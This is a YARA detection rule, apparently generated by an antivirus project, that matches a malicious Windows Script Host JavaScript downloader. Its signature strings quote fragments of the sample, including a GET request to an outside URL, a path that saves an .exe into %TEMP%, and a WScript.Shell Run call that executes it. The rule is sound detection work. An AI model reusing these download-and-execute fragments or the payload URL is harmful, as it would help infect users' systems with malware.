rule sig_20160328_e896f6d659304c9e359db4cd7a16bc81 {
  meta:
    description = "datamaliciousorder - file 20160328_e896f6d659304c9e359db4cd7a16bc81.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1d120e78d6a68abf8741a3dd00fb3fbe51af8c91990c7ea0033f4b6da7d0a9b8"

  strings:
    $s1  = "function Nuefv() {return Zernm[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"9qWCb3pAM.exe\";};" fullword ascii
    $s2  = "do {WScript[Oiivr](Mqrxccm() * 11)} while (Ktmayte[\"readystate\"] < 4 );" fullword ascii
    $s3  = "var Zernm = function Qzzwzum() {return WScript[Kkuft](\"WScript.Shell\");}();" fullword ascii
    $s4  = "function Yxfuakdhfx(Bgcehav, Rcmesq){return Bgcehav - Rcmesq;};" fullword ascii
    $s5  = "Ktmayte[Ldhtweg](\"GET\", \"http://www.stopeugenicsnow.eu/m8dhs\", false);" fullword ascii
    $s6  = "function Qstkfjlig() {return ((Vcvquqwtuw == true) && (Vcvquqwtuw == Jpgaska)) ? 1 : Aszzeq;};" fullword ascii
    $s7  = "function Onwecx(Liqxhlpl){Zernm[\"Run\"](Liqxhlpl, Aszzeq, Aszzeq);};" fullword ascii
    $s8  = "var Wcqvhu = new this[\"Date\"]();" fullword ascii
    $s9  = "return Yxfuakdhfx(Wvjusj, Arcqcmsny);" fullword ascii
    $s10 = "Jpgaska = true; " fullword ascii
    $s11 = "function Isylgxu(){return Djwkvm;};" fullword ascii
    $s12 = "Vcvquqwtuw = true; " fullword ascii
    $s13 = "var Vcvquqwtuw = false;" fullword ascii
    $s14 = "var Jpgaska = false;" fullword ascii
    $s15 = "function Yuwqy(Ljiqm) {var Szqrr = (1, 2, 3, 4, 5, Ljiqm); return Szqrr;};" fullword ascii
    $s16 = "function Qxcyrky(){return Kkuft;};" fullword ascii
    $s17 = "function Eqmdqb()" fullword ascii
    $s18 = "function Mqrxccm(){return 22;};" fullword ascii
    $s19 = "var Vqels = false;" fullword ascii
    $s20 = " while (Enhxkl){" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}